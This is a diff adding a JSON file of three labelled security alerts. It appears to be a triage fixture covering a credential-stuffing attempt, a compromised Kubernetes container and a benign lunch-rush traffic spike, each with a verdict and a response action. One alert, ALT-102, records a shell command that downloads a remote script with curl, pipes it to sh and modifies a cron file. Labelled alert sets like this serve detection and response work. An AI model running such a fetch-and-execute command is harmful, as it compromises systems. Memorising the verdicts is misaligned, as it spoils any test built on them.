@@ -1,0 +1,33 @@
+[
+  {
+    "id": "ALT-101",
+    "source": "WAF-EDGE",
+    "src_ip": "198.51.100.44",
+    "endpoint": "POST /api/v1/checkout",
+    "rate_per_min": 2800,
+    "status_breakdown": {"401": 4116, "200": 84},
+    "auth_header": "invalid_or_missing",
+    "verdict": "TRUE_POSITIVE_CRED_STUFFING",
+    "safe_action": "BLOCK_IP_198.51.100.44"
+  },
+  {
+    "id": "ALT-102",
+    "source": "EDR-K8S",
+    "host": "order-worker-02",
+    "process": "/bin/sh -c curl -s http://203.0.113.99/update.sh | sh",
+    "file_mod": "/etc/cron.d/telemetry-sync",
+    "verdict": "CRITICAL_CONTAINER_COMPROMISE",
+    "safe_action": "ISOLATE_POD_HASH_EVIDENCE_ROTATE_KEYS"
+  },
+  {
+    "id": "ALT-103",
+    "source": "WAF-EDGE",
+    "src_ip": "192.0.2.15",
+    "endpoint": "POST /api/v1/checkout",
+    "rate_per_min": 1900,
+    "status_breakdown": {"200": 1885, "400": 15},
+    "auth_header": "valid_pos_key_store_412",
+    "verdict": "FALSE_POSITIVE_LUNCH_RUSH",
+    "safe_action": "ALLOW_NO_BLOCK"
+  }
+]
